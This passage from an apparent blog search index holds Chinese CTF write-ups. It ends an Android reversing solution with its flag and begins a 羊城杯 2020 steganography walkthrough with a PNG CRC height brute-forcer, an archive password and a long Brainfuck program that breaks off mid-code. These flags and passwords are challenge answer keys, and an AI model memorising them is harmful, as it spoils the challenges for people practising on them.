class=\"string\">&quot;text&quot;</span>:Landroid/widget/TextView;</span><br><span class=\"line\"><span class=\"keyword\">const</span>-string v0, <span class=\"string\">&quot;flag&#123;25f991b27f&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">.line <span class=\"number\">33</span></span><br><span class=\"line\">.local v0, <span class=\"string\">&quot;True1&quot;</span>:Ljava/lang/String;</span><br><span class=\"line\"><span class=\"keyword\">const</span>-string v1, <span class=\"string\">&quot;c&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">.line <span class=\"number\">34</span></span><br><span class=\"line\">.local v1, <span class=\"string\">&quot;True2&quot;</span>:Ljava/lang/String;</span><br><span class=\"line\"><span class=\"keyword\">const</span>-string v2, <span class=\"string\">&quot;dc2f7a82a2b34&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">.line <span class=\"number\">35</span></span><br><span class=\"line\">.local v2, <span class=\"string\">&quot;True3&quot;</span>:Ljava/lang/String;</span><br><span class=\"line\"><span class=\"keyword\">const</span>-string v3, <span class=\"string\">&quot;3&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">.line <span class=\"number\">36</span></span><br><span class=\"line\">.local v3, <span class=\"string\">&quot;True4&quot;</span>:Ljava/lang/String;</span><br><span class=\"line\"><span class=\"keyword\">const</span>-string v4, <span class=\"string\">&quot;86e81c4&#125;&quot;</span></span><br></pre></td></tr></table></figure>\n<p>看一下代码就能得到flag了。<br>flag:<del>flag{25f991b27fcdc2f7a82a2b34386e81c4}</del></p>\n","categories":["Misc","图片隐写","Reverse","Android"]},{"title":"羊城杯 2020-逃离东南亚","url":"/2021/08/31/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020-%E9%80%83%E7%A6%BB%E4%B8%9C%E5%8D%97%E4%BA%9A/","content":"<p><a href=\"https://buuoj.cn/challenges#[%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020]%E9%80%83%E7%A6%BB%E4%B8%9C%E5%8D%97%E4%BA%9A\">题目链接</a><br>附件解压，得到三个压缩包：<br>![](/images/Writeup/20210831154609.png]</p>\n<h1 id=\"0x01-日志1\"><a href=\"#0x01-日志1\" class=\"headerlink\" title=\"0x01 日志1\"></a>0x01 日志1</h1><p>日志1可以无密码解压，得到：<br>![](/images/Writeup/20210831155101.png]<br>但是打开img.png却失败了，怀疑又是修改了图片高度导致CRC校验出错，于是脚本一梭子：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"></span><br><span class=\"line\">misc = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;img.png&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>).read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1024</span>):</span><br><span class=\"line\">    data = misc[<span class=\"number\">12</span>:<span class=\"number\">20</span>] + struct.pack(<span class=\"string\">&#x27;&gt;i&#x27;</span>, i) + misc[<span class=\"number\">24</span>:<span class=\"number\">29</span>]</span><br><span class=\"line\">    crc32 = binascii.crc32(data) &amp; <span class=\"number\">0xffffffff</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> crc32 == <span class=\"number\">0x01cb15b8</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br></pre></td></tr></table></figure>\n<p>计算出正确的图片高度应该是300,修改后就得到了正确的图片：<br>![](/images/Writeup/20210831181149.png]</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">WDNMD</span><br></pre></td></tr></table></figure>\n<p>得到日志2的压缩包密码，解压后得到：<br>![](/images/Writeup/20210831181234.png]</p>\n<h1 id=\"0x02-日志2\"><a href=\"#0x02-日志2\" class=\"headerlink\" title=\"0x02 日志2\"></a>0x02 日志2</h1><p>日志.md里面是没用的数据，可以略过，关注点先放在test这个文件上。[[010Editor]打开test，发现是一串Brainfuck代码，但是在线解码却出现问题：<br>![](/images/Writeup/20210831181422.png]<br>![](/images/Writeup/20210831181446.png]<br>于是结合Brainfuck代码的正确格式，在头部补充”++++++++”，正确的Brainfuck代码是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">++++++++[&gt;&gt;++&gt;++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;++++++++++++&gt;++++++++++++++&gt;++++++++++++++++&gt;++++++++++++++++++&gt;++++++++++++++++++++&gt;++++++++++++++++++++++&gt;++++++++++++++++++++++++&gt;++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++&gt;++++++++++++++++++++++++++++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;&gt;&gt;&gt;++++++.&lt;&lt;&lt;.&gt;&gt;++++++.---------.+++++.&gt;+.&lt;&lt;+++++++++.-------.-.&gt;-.&lt;............++++++++.--------.&gt;-.&gt;.&lt;&lt;.+.-....&gt;&gt;----.&lt;&lt;.&gt;++.&lt;.......+.-..........&gt;--------.&gt;++++.------.&lt;&lt;.............++++.----..&gt;+++++.&lt;..&gt;-----.&lt;.++++.----..&gt;--.&gt;&gt;+++++++.&lt;&lt;&lt;.&gt;&gt;++.&lt;&lt;..&gt;&gt;----------.&lt;&lt;....&gt;--.&lt;....&gt;&gt;--------.&lt;&lt;.........+.-..&gt;-.&lt;.......&gt;.&lt;..&gt;&gt;.&lt;&lt;.......&lt;-----.&gt;.&gt;.&lt;.......&gt;-.&lt;&lt;+++++++++.&gt;.&gt;&gt;.&lt;&lt;........&gt;&gt;&gt;----------------.&lt;&lt;&lt;..........&gt;&gt;&gt;&gt;---------.&lt;&lt;&lt;&lt;....&gt;&gt;.&lt;&lt;....&lt;.&gt;.&gt;&gt;&gt;.&lt;&lt;&lt;.......&gt;.&gt;&gt;.&lt;&lt;-.&gt;.&lt;&lt;.......&gt;&gt;--.&lt;&lt;.&gt;&gt;-----.&lt;&lt;........&gt;&gt;&gt;----.&lt;&lt;&lt;.........+.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-..........&gt;&gt;+++++++.&lt;&lt;.........+.-....+.&gt;&gt;.&lt;&lt;-................+.-..........&gt;++.&lt;.......&gt;&gt;-.&gt;&gt;.&lt;&lt;&lt;+++.&lt;........&lt;-----.&gt;.&gt;&gt;&gt;.&lt;&lt;&lt;..........++.--........&gt;---.&lt;....&gt;++.&lt;....&gt;--.&lt;.&lt;+++++.&gt;........&gt;&gt;+.&lt;-.&gt;&gt;++++++++++.&lt;&lt;&lt;.......+.-.&gt;&gt;--.++++++++++.&lt;&lt;.......&gt;&gt;&gt;+.&lt;--------.&lt;+++++.&lt;.......++.&gt;&gt;&gt;-------.&lt;&lt;&lt;--.&gt;&gt;&gt;.&lt;&lt;&lt;..........&gt;.&lt;........&gt;&gt;&gt;.&lt;&lt;&lt;....&gt;&gt;++++++++.&lt;&lt;....&gt;&gt;&gt;++++++++.&lt;&lt;&lt;+++.&gt;&gt;&gt;--------.&lt;&lt;&lt;---.......++.&gt;&gt;&gt;.&lt;&lt;++++++.&gt;.&lt;&lt;--.......&gt;----.&lt;.&lt;+.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;......+++.&gt;++++++.&lt;---.&gt;.&lt;.......&gt;---.&lt;.+.-........++.--..........++++.----....+.-....+++++.&gt;+++.&lt;---.--........&gt;&gt;---.&lt;&lt;.&gt;-------.&lt;.......+.&gt;&gt;-.&lt;&lt;-.&gt;&gt;&gt;++++.&lt;&lt;&lt;.......++++.&gt;&gt;----.&lt;&lt;----.........&gt;&gt;+.&lt;&lt;..........++++.----.........&gt;----.--.&gt;&gt;+.--------.&lt;&lt;+++.&gt;-.&lt;--.&lt;....&lt;----.&gt;.&gt;&gt;++++++++.&lt;&lt;.......&gt;-.&gt;----.&lt;&lt;+.&gt;&gt;&gt;+++++++.&lt;&lt;&lt;-.......&gt;&gt;-------.+++.&lt;+++.&gt;.&lt;&lt;.......&gt;&gt;---.&lt;&lt;..........&lt;-.&gt;..........&gt;&gt;+++.&lt;&lt;.........&gt;&gt;++++.&gt;------.&lt;+.&lt;&lt;&lt;.&gt;&gt;&gt;++++.&lt;&lt;.&gt;&gt;-.&lt;&lt;.........................................................&gt;--.&lt;.........+.&gt;&gt;------.&lt;&lt;&lt;+++++.&gt;&gt;&gt;+++++.------.&gt;++++++.&lt;&lt;&lt;.-....+.-.&gt;&gt;---.&lt;&lt;........&gt;.&lt;.&lt;.&gt;&gt;&gt;&gt;----.&lt;&lt;&lt;.......&gt;&gt;++.&lt;-.&gt;&gt;++++++.&lt;&lt;&lt;.......&gt;&gt;-.&lt;&lt;.+.-........&lt;+++.&gt;.&gt;+.&lt;........+.-.........++.&lt;+.&gt;&gt;&gt;&gt;&gt;----.&lt;------------.&lt;+++++++.&lt;++++.&lt;&lt;-------.&gt;&gt;+++++.&lt;.&lt;+++++++.&gt;&gt;&gt;&gt;&gt;.&lt;&lt;+++.&lt;&lt;.&lt;--------.&gt;&gt;&gt;&gt;&gt;.&lt;.&lt;---.&lt;&lt;&lt;++++.----.&gt;&gt;&gt;&gt;++++.&lt;&lt;&lt;.&lt;.+++.&gt;&gt;+.&lt;+.&gt;&gt;++.&gt;&gt;+.&lt;&lt;&lt;-.&gt;&gt;+++++.&lt;&lt;+++.&gt;&gt;&gt;+.&lt;-------.&lt;&lt;&lt;&lt;--.++++++.&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;----.&gt;&gt;++++.&lt;&lt;&lt;---.++++.----....++++.----.....++++.----...+.&gt;-----.&gt;-----.&gt;+++++.&lt;+.&lt;&lt;-.......&gt;+.&lt;....&gt;--.&lt;....&gt;++.&lt;.....&gt;&gt;----.&lt;&lt;....&gt;&gt;++++.&lt;&lt;.....&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;...++++.&gt;&gt;&gt;--------.&lt;&lt;++++++.&gt;+.&lt;++.&lt;---.&gt;------.----.&gt;&gt;&gt;++.-.&lt;&lt;.&gt;&gt;-----.&lt;&lt;&lt;+++++++.---.&gt;&gt;-.++++++.&lt;&lt;+++++.------.&gt;&gt;&gt;++++.&lt;&lt;&lt;---.&lt;-.&gt;&gt;&gt;++++.-.&lt;.&gt;&gt;--.&lt;&lt;.&lt;&lt;&lt;----..&gt;&gt;&gt;&gt;--.&gt;++.&lt;&lt;----.++++.&gt;---.&lt;&lt;--.&lt;....+.-.....&gt;&gt;-----.&lt;&lt;..............................................................++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;--...+.&gt;++++.&lt;-.........................&gt;---.&gt;&gt;.&lt;&lt;&lt;...+.&gt;+++.&lt;-.........................&gt;++.&lt;....++.--..........................++++.----....+.&gt;--.&lt;-..........................&gt;--.&gt;&gt;&gt;+.--------.&lt;&lt;++++++++.&gt;&gt;---.&lt;&lt;&lt;++++++.&gt;&gt;&gt;++++++++.&lt;----.&lt;&lt;&lt;&lt;--.++++++.&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;+.&gt;&gt;++++.&lt;&lt;&lt;+.&gt;&gt;&gt;&gt;++.&lt;---.&lt;-.&lt;++++.&gt;&gt;&gt;+++.&lt;&lt;&lt;&lt;-.+++++++.&gt;----.&gt;&gt;&gt;-------.&lt;&lt;++.---.-.&gt;&gt;++++.&lt;&lt;&lt;&lt;-------.+++++.&lt;+.&gt;&gt;&gt;&gt;++.----.&lt;&lt;&lt;+.&gt;&gt;&gt;++++++++++.---.&lt;+++.&lt;&lt;&lt;--------.++++++++.&gt;&gt;&gt;&gt;&gt;+++.&lt;-----.&lt;&lt;&lt;.-.&gt;&gt;&gt;&gt;-.&lt;.&lt;&lt;&lt;.&lt;.&gt;&gt;&gt;&gt;&gt;-----.&lt;&lt;.--.&gt;++++++++.&gt;+.&lt;&lt;&lt;&lt;-----.+++++.&lt;.&gt;&gt;&gt;&gt;------.&lt;+++.&lt;&lt;&lt;-------.-.&gt;&gt;&gt;&gt;&gt;+.&lt;----.++++++++++.&lt;&lt;&lt;&lt;++++++++.&gt;&gt;&gt;&gt;&gt;++++.&lt;--------.&lt;&lt;&lt;+.-.&gt;&gt;&gt;&gt;-.&lt;.&lt;&lt;&lt;.&lt;.&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;-----.++++.&gt;&gt;&gt;--.&lt;&lt;-.++++++.++.&lt;+++++.------.&gt;&gt;--.&gt;&gt;+.&lt;&lt;&lt;&lt;+++++.&gt;&gt;&gt;&gt;-----.&lt;&lt;&lt;&lt;++++.&gt;&gt;&gt;+++++.&lt;&lt;&lt;&lt;-----.---.&gt;------------......++++++++.--------..&gt;&gt;&gt;--.&lt;&lt;&lt;....++++++++.--------....+.-..++++.----..&gt;----.&lt;...+.-..........&gt;&gt;&gt;---.&lt;&lt;+.&gt;&gt;&gt;-----..&lt;&lt;&lt;&lt;++.&gt;-.&lt;--...&gt;&gt;&gt;+++.&lt;&lt;&lt;.&lt;++.&gt;.........&gt;-.&gt;&gt;.&lt;&lt;.&gt;+.&lt;&lt;.......+.&gt;&gt;&gt;.&lt;&lt;&lt;-....&gt;---.&lt;..............+.&gt;&gt;&gt;.&lt;&lt;++++.&gt;.&lt;&lt;-.......+.&gt;&gt;&gt;&gt;+++++++.&lt;&lt;&lt;&lt;-....++++.----..............++.--.&gt;.&gt;.&lt;&lt;.......+.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-....++++++++.--------..............++.&gt;&gt;&gt;.&lt;&lt;.&gt;.&lt;&lt;--.......+.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-....&gt;.&lt;..............++++.&gt;&gt;&gt;++.&lt;&lt;&lt;-.&lt;++++.&gt;---.&gt;&gt;&gt;-.&lt;&lt;&lt;++++++++.&gt;&gt;&gt;+.&gt;.&lt;&lt;-.&gt;&gt;---.&lt;&lt;&lt;&lt;------.&gt;&gt;&gt;&gt;+++++.&lt;&lt;&lt;&lt;--..&gt;++.&lt;++++++++.&gt;&gt;.&lt;&lt;--------.&gt;&gt;&gt;-----.&lt;&lt;&lt;.&gt;&gt;.&gt;&gt;----------.&lt;&lt;&lt;.&gt;&gt;&gt;++++++++.&lt;&lt;&lt;&lt;...++++.&gt;&gt;&gt;+++++.&lt;&lt;&lt;-.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;&lt;---.&gt;&gt;&gt;+.&lt;&lt;&lt;+++.---........&lt;--------.&gt;&gt;&gt;&gt;&gt;++.&lt;&lt;.&gt;-.&lt;&lt;&lt;++.&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;&lt;--..&lt;.&gt;&gt;&gt;&gt;&gt;.&lt;&lt;.&gt;++.&lt;&lt;&lt;++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;--..+++.&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;&lt;&lt;++++++++++.&gt;---..&gt;---.&lt;&lt;-.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;&lt;----.&gt;&gt;&gt;&gt;-----.&gt;-----.&lt;.&lt;&lt;&lt;.++++++.&gt;&gt;&gt;.&lt;&lt;&lt;------.....&lt;++.&gt;&gt;&gt;&gt;--.&lt;&lt;&lt;+++.&lt;-------.....&gt;++++++.&gt;&gt;&gt;-.&gt;----.&lt;&lt;&lt;&lt;++.---.--------.+.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;-.&gt;+.&lt;...&gt;--.&gt;&gt;&gt;-.&lt;&lt;&lt;++.&lt;&lt;.....&gt;&gt;&gt;&gt;&gt;+++++++++++.&lt;&lt;.&lt;++.&lt;++.&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;--..&gt;&gt;&gt;---.&lt;&lt;&lt;.++++++++.--------...+++.&gt;&gt;&gt;&gt;---------.+++++++.&lt;&lt;&lt;---.&lt;&lt;....+++++++++.&gt;&gt;&gt;&gt;+++++++++++.-.----.&gt;----.&lt;.&lt;&lt;&lt;---.++++++.&gt;&gt;&gt;------.&lt;&lt;+.&lt;------...........&gt;&gt;&gt;&gt;+++++.&lt;&lt;&lt;&lt;&lt;-.&gt;&gt;&gt;---.&gt;&gt;-----------.&lt;&lt;&lt;-------.&lt;&lt;-------.&gt;&gt;&gt;+.&lt;&lt;&lt;+++++.&gt;&gt;-.&gt;&gt;&gt;----.&lt;++++.&lt;&lt;+.-.&gt;&gt;++.&lt;&lt;&lt;&lt;----------.&gt;&gt;&gt;--.&gt;&gt;++++++++++++++.&lt;&lt;+.&lt;---.&gt;---.&lt;++++.&gt;&gt;&gt;+.&lt;&lt;&lt;&lt;---------.&gt;--------.&gt;-.&lt;.&gt;&gt;++++.&lt;&lt;-..&gt;++.------.&gt;-----.&lt;&lt;+.&lt;----.&gt;-.&gt;+++++++++.&lt;..++++.&gt;&gt;++++.&lt;&lt;+++.&gt;&gt;&gt;.&lt;&lt;&lt;&lt;--.&gt;&gt;+++.&lt;--.&gt;--------.&lt;-----.+++.&gt;&gt;+++++.+.&lt;&lt;&lt;---.....&gt;&gt;+.&gt;---.&lt;&lt;.&gt;&gt;&gt;.&lt;&lt;&lt;&lt;++++++++++.&gt;+.----..++.&lt;-----.&gt;&gt;&gt;&gt;----.++++.&lt;&lt;&lt;-.&gt;&gt;------.&lt;&lt;-.+++++.&gt;++++.&lt;+++.+++.&gt;&gt;-----.&lt;&lt;-----------.&gt;-----.++++++++.&lt;.+.+++++++.&gt;&gt;+++++.&lt;&lt;&lt;&lt;++++.&gt;&gt;&gt;&gt;.&lt;&lt;++++++.++++.----------.&gt;&gt;+++++++.--.--------.++++.&gt;---.&lt;&lt;&lt;&lt;.&gt;--------.....++++.&gt;&gt;+.&lt;&lt;+.&gt;&gt;&gt;++.&lt;&lt;&lt;++.&gt;--------.+.++++++.&gt;-------.&lt;&lt;&lt;&lt;----.&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;---.++.------..&lt;&lt;++++.----.&gt;&gt;+.&gt;&gt;&gt;----------.&lt;&lt;&lt;++.&gt;&gt;&gt;+++++++++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;+.----......+.&gt;&gt;++.&gt;-..&lt;&lt;&lt;&lt;++++.&gt;&gt;&gt;++.&lt;-------.&lt;-.+.&gt;&gt;+++++++.&lt;-----.&gt;------.&lt;&lt;&lt;.&gt;&gt;&gt;-.++.&lt;&lt;-.......&gt;&gt;&gt;-.----.&lt;&lt;&lt;.&gt;+++++.++++++++.&lt;.+.&gt;---.---.&lt;+++++++.-.&gt;&gt;&gt;+++.--.&lt;&lt;&lt;------..&gt;&gt;-.&lt;&lt;-.++++.&gt;&gt;+++.&lt;&lt;---.&lt;&lt;++++.&gt;&gt;&gt;&gt;---.&lt;-----.-----.&gt;++.----.&lt;+++++++++++++.&lt;+++++++.&gt;&gt;++++.---.&lt;&lt;-------.+++++++.&gt;&gt;&gt;++++.&lt;-.++.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;---.&lt;--------.+++++++.-.&gt;.-----.&lt;+.&lt;&lt;----.&gt;&gt;&gt;&gt;---.&lt;&lt;------.&gt;+++++++++.&lt;&lt;----.&gt;-.....++++.&gt;&gt;+++++.&lt;&lt;+.&gt;&gt;&gt;.&lt;&lt;&lt;++.&gt;------.&lt;++++.&gt;+++++++.&gt;-------.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;-------.++.------..&lt;&lt;++++.----.&gt;&gt;.&gt;--------.&lt;+++++++.&gt;&gt;&gt;.&lt;&lt;&lt;------.&gt;&gt;++.&gt;.&lt;&lt;&lt;&lt;--.&gt;&gt;+++++++++.---------.&lt;++++++.&lt;--.&gt;&gt;+.&lt;-------..++++++++.--------.--------.&gt;&gt;++++.-.&gt;----.&lt;.&lt;&lt;++++++++..+.&lt;+.&gt;+++.&gt;+++++..&lt;++++.&gt;&gt;++.----.&lt;++.&gt;&gt;----.&lt;---.&gt;+++++++.&lt;&lt;&lt;&lt;--...++.++.&gt;--.-----.&gt;.&lt;+++++++++++.-.---.--------..+.&lt;+++++..&gt;+++++++++++.+++.--------.&lt;&lt;+++++.&gt;&gt;-------..&gt;&gt;&gt;.+++.&lt;&lt;&lt;.&gt;---------.&gt;---------.&lt;&lt;.+.&gt;------.&gt;++++++++++++++.&gt;+.&lt;&lt;&lt;&lt;.&gt;-.&gt;&gt;---.&lt;++++++++.+++++++.&gt;&gt;--------.&lt;+++++++.&gt;+++++.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;-----.&lt;&lt;.+++++++++++.&gt;&gt;+.&lt;&lt;&lt;+++++++++.....&gt;&gt;-----.&lt;---.&gt;+++++.&lt;&lt;.&gt;&gt;&gt;---.&lt;&lt;+++++++.&lt;+++++.&gt;&gt;--.&lt;+++.&lt;+++.&gt;&gt;&gt;&gt;---------.--.&lt;&lt;&lt;&lt;&lt;-.++++++++++.&gt;-------.&gt;&gt;&gt;.&lt;&lt;&lt;&lt;---.&gt;&gt;&gt;++.&gt;&gt;++++++.&lt;&lt;&lt;&lt;&lt;-------...&gt;---------.&gt;&gt;--.&lt;.----------.&gt;&gt;&gt;----.--.&lt;&lt;---.&lt;.&gt;---.&gt;&gt;+++++++.&lt;&lt;&lt;----.++++.&gt;&gt;&gt;-------.&lt;&lt;&lt;&lt;.&lt;.&gt;&gt;----.&gt;&gt;&gt;---.&lt;&lt;&lt;+++++.&gt;&gt;.++.&lt;&lt;-------.&lt;&lt;.&gt;&gt;&gt;&gt;-----.&lt;&lt;--.&gt;&gt;-------.&lt;&lt;..&gt;-.&gt;&gt;.+++++++++++++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;--.&lt;&lt;&lt;&lt;&lt;..&gt;&gt;&gt;&gt;&gt;.+.&lt;&lt;&lt;++++.----...++.&lt;&lt;+++++.&gt;&gt;--.....&gt;.&gt;&gt;-------------.&lt;&lt;&lt;++.&lt;&lt;-----.&gt;&gt;&gt;&gt;&gt;++++++++++++.&lt;&lt;&lt;&lt;&lt;..&gt;&gt;&gt;&gt;&gt;.&lt;&lt;&lt;&lt;&lt;++++.&gt;&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;++++.&gt;++.&lt;------.+++.&gt;&gt;&gt;--------.--.&lt;&lt;-.&lt;&lt;--.&lt;----..&gt;.+.&gt;--.-....&gt;&gt;&gt;++++++++.&lt;&lt;&lt;.....+++.&gt;&gt;&gt;------.++.-----------.&lt;&lt;&lt;&lt;-.&lt;..&gt;.&lt;----.&gt;&gt;&gt;-----.&lt;--.&gt;&gt;&gt;+++++.&lt;&lt;&lt;-..&lt;-.&gt;&gt;---.&lt;&lt;&lt;++++.----.++++..----.++++.&gt;&gt;.&gt;+++++++++.&lt;...&gt;-----.&gt;&gt;----.&lt;&lt;&lt;.....&lt;.&gt;&gt;--.&lt;+++.&lt;&lt;----.++++..----.++++.&gt;&gt;&gt;&gt;&gt;++++++++++.&lt;&lt;&lt;---.&gt;&gt;.&lt;&lt;..&gt;+++++.&gt;&gt;---------.+++++.&lt;&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;&gt;+++++++++.&lt;&lt;&lt;&lt;&lt;..&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;.....+++.&gt;-----.&gt;&gt;++.&lt;&lt;&lt;&lt;&lt;+++.&gt;&gt;&gt;&gt;-.&gt;--.&lt;&lt;&lt;.&gt;&gt;&gt;+++.&lt;&lt;&lt;&lt;&lt;-------.&gt;&gt;+.----.......&gt;++++++.&lt;+++++++.&lt;&lt;+++++.&gt;&gt;&gt;+.&lt;-------..++++.+.&gt;&gt;-.&lt;.&gt;--.++++.&lt;&lt;----.&gt;&gt;+++++++++++++++.---.&lt;&lt;&lt;+++.&gt;.&gt;+++++.-.&lt;++++.&gt;.-.&lt;+++.&lt;&lt;.&gt;&gt;&gt;&gt;++++++.&lt;&lt;-.&gt;&gt;-----...&lt;&lt;-------.+++++.&gt;++.&lt;+++.&gt;&gt;+++.&lt;---.&lt;&lt;&lt;.&gt;&gt;&gt;&gt;-----.&lt;&lt;------..--..&gt;++.&lt;&lt;&lt;.&gt;&gt;&gt;&gt;++++++++.&lt;&lt;+++++++++.&lt;.&gt;&gt;&gt;--.++.&lt;&lt;.&lt;&lt;+.&gt;&gt;&gt;.&gt;&gt;-.&lt;+++.&lt;&lt;&lt;&lt;++++.&gt;&gt;&gt;.&gt;-------.&lt;&lt;------.&lt;&lt;++.&gt;&gt;---.&gt;&gt;-.&lt;&lt;++++++++.&gt;&gt;&gt;.&lt;--.&lt;&lt;&lt;&lt;-------.&gt;&gt;-----.&lt;---.&gt;&gt;------.&lt;&lt;&lt;-.&gt;+++.&lt;..&gt;.&gt;+++++.&gt;&gt;++.---.&lt;&lt;&lt;&lt;++.-.&gt;&gt;.-----.++++.&gt;&gt;---.&lt;&lt;----.&gt;&gt;&gt;+.&lt;&lt;&lt;&lt;&lt;-----.&gt;&gt;+.----......+.&gt;--.&gt;+++++++.----.&gt;--------.&lt;&lt;.&gt;++++.---.------------.&lt;&lt;+++.&gt;&gt;&gt;-------.---.&lt;&lt;&lt;&lt;.&gt;---.&lt;&lt;++++.&gt;&gt;&gt;&gt;&gt;++++++++++++++++++.&lt;------.+++++++++++++++.&lt;++++++.&lt;+++++++.&gt;---.&lt;-----.---.&gt;+++++.&gt;++++.&lt;&lt;&lt;----.+.---.&gt;&gt;+++.&gt;&gt;-------.&lt;&lt;-----.&lt;++++++++.&gt;---.&lt;----.--.+++.&gt;&gt;&gt;+++.&lt;---.&lt;+.+++++.&gt;&gt;++++.&lt;&lt;&lt;----.&gt;++.---.&lt;++++.&gt;&gt;+.&lt;----.+++++.&lt;&lt;&lt;.&gt;&gt;--.&gt;&gt;++++++.&lt;&lt;+++.&gt;+++.&gt;&gt;---.&lt;&lt;&lt;---.&gt;&gt;&gt;+++.&lt;&lt;&lt;&lt;&lt;----.&gt;&gt;+.----......+++.&gt;&gt;&gt;++.---..&lt;&lt;&lt;---..&gt;------.&lt;++++++++.&gt;---.&gt;&gt;----.&lt;&lt;&lt;------.++.&gt;&gt;--.&lt;&lt;-.&gt;&gt;&gt;+++++.&lt;&lt;&lt;---.&gt;&gt;+.&lt;&lt;+++.---.....&gt;+.&lt;.++.--......+.&gt;&gt;+++++.&lt;+++++++++.---.&gt;---.&lt;&lt;&lt;&lt;.&gt;&gt;&gt;&gt;--------.&lt;&lt;&lt;-.&gt;&gt;&gt;++++..----.&lt;&lt;+.-.&lt;+++.&gt;&gt;&gt;--.&lt;&lt;&lt;--.&gt;&gt;--.&gt;+++++.---.&lt;&lt;&lt;-.&gt;++++.&gt;&gt;&gt;---.&lt;.&lt;&lt;--.&lt;++++++.&lt;++++.&gt;&gt;---.+++++++.&gt;&gt;.++++.------.&gt;-------.&lt;&lt;----.&gt;+++++.&lt;++++++++.------.&lt;------.&gt;&gt;&gt;-.&lt;-----.&lt;&lt;+++++.-.&gt;&gt;&gt;+.&lt;&lt;---.&gt;&gt;+++++++++++.&lt;&lt;&lt;-----..&gt;&gt;+.&lt;&lt;&lt;&lt;+++.&gt;+.&gt;&gt;&gt;&gt;.&lt;.+++++++++++.--.&lt;&lt;&lt;&lt;-------.&gt;&gt;&gt;&gt;--------.&lt;&lt;++++++.&gt;&gt;++++.++++.---------.++++++++++.&lt;+++++.&gt;------.------.&lt;+++.&lt;++++++.&gt;&gt;++++++.-----.+++++++++++.&lt;&lt;&lt;-.&gt;&gt;&gt;------.&lt;++.&gt;++++++.&gt;-.&lt;-----.&lt;.&gt;&gt;-.&lt;&lt;&lt;&lt;+++++++++..........&gt;&gt;-.&gt;++++++.&lt;---.&lt;&lt;&lt;+++++.&gt;&gt;----.--.&lt;&lt;+.&gt;&gt;&gt;&gt;------.---.&lt;+.&lt;+++.&gt;&gt;+++++++.&lt;&lt;-.-.&gt;&gt;.&gt;-.&lt;--------.&lt;+.&lt;+.&gt;&gt;+++.&lt;+.&lt;&lt;&lt;+.&gt;&gt;---.&gt;&gt;&gt;-.&lt;&lt;&lt;+++.--.&gt;+.&gt;&gt;-----.&lt;-----.&gt;---.&lt;&lt;---------.&gt;+++++.----.&lt;&lt;&lt;&lt;.+++++++.&gt;&gt;&gt;&gt;&gt;+++++++.&lt;&lt;+++++++++.--.------.&gt;&gt;-----.&lt;--.&lt;+++++.&lt;&lt;&lt;----.&gt;&gt;&gt;&gt;&gt;-.&lt;&lt;&lt;++.-.&gt;-.&gt;&gt;++++++++++++.&lt;&lt;++++.---.+++.&lt;&lt;&lt;----.&gt;&gt;&gt;&gt;+.&lt;&lt;&lt;++.++.----....+.&gt;-.&gt;&gt;&gt;---.&lt;&lt;&lt;++++++.&lt;&lt;++++++.&gt;&gt;.&lt;-.....&gt;&gt;-----.&lt;&lt;...+.&gt;.&lt;&lt;--------.&gt;&gt;&gt;&gt;++++.&lt;&lt;&lt;&lt;..&gt;&gt;&gt;&gt;.&lt;&lt;&lt;-....&gt;---.&gt;&gt;&gt;+++.&lt;&lt;&lt;&lt;--------.&lt;..&gt;.&gt;+++.&lt;++++++++....&gt;&gt;&gt;+++++.&gt;----.&lt;&lt;&lt;&lt;&lt;++++++++.--------..+++++++.&gt;&gt;++++.&lt;....&gt;----.&lt;&lt;-------....&gt;&gt;&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;....&gt;-----.&gt;&gt;&gt;++.&lt;&lt;&lt;&lt;&lt;...+++++++++.&gt;&gt;+++++.&lt;.&gt;++++.&